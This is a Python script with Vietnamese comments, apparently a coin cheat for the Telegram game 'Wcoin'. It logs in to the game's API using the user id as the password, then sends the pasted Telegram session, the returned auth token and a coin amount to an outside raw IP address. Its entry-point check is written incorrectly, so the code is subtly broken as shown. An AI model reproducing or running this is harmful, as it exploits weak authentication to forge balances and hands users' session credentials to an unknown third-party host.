import json
import requests
from urllib.parse import urlparse, parse_qs

def extract_user_data(session):
    """
    Hàm tách thông tin người dùng từ session URL.
    """
    parsed_url = urlparse(session)
    query_params = parse_qs(parsed_url.fragment)
    tgWebAppData = query_params.get('tgWebAppData', [None])[0]

    if not tgWebAppData:
        raise ValueError("Session không hợp lệ. Vui lòng kiểm tra lại.")

    user_data = json.loads(parse_qs(tgWebAppData)['user'][0])
    return user_data


def authenticate_user(identifier):
    """
    Hàm xác thực người dùng thông qua API.
    """
    auth_url = "https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local"
    payload = {
        "identifier": identifier,
        "password": identifier  # Giả sử mật khẩu giống với identifier
    }

    response = requests.post(auth_url, json=payload)
    
    if response.status_code != 200:
        raise Exception("Xác thực thất bại. Vui lòng kiểm tra lại API.")

    return response.json()


def send_transaction(session, auth_data, amount, key):
    """
    Hàm gửi thông tin giao dịch đến API.
    """
    transaction_url = "http://77.37.63.209:5000/api"
    payload = {
        "initData": session,
        "serverData": auth_data,
        "amount": amount,
        "key": key
    }

    response = requests.post(transaction_url, json=payload)
    
    if response.status_code != 200:
        raise Exception("Gửi giao dịch thất bại. Kiểm tra lại payload hoặc API endpoint.")

    return response.json()


if name == "main":
    # Nhập dữ liệu từ người dùng
    session = input("Nhập Wcoin Session: ")
    amount = input("Nhập số lượng coin: ")
    key = input("Nhập Authorization Key (nếu có, bỏ qua nếu không): ")

    try:
        # Tách dữ liệu người dùng từ session
        user_data = extract_user_data(session)
        identifier = user_data["id"]

        # Xác thực người dùng
        auth_data = authenticate_user(identifier)

        # Gửi giao dịch
        transaction_result = send_transaction(session, auth_data, amount, key)

        # Hiển thị kết quả
        print("\n=== KẾT QUẢ ===")
        print(f"Tên người dùng: {transaction_result.get('username', 'N/A')}")
        print(f"Email: {transaction_result.get('email', 'N/A')}")
        print(f"Số dư: {transaction_result.get('balance', 'N/A')}")
        print("================\n")
    except Exception as e:
        print(f"Lỗi: {e}")
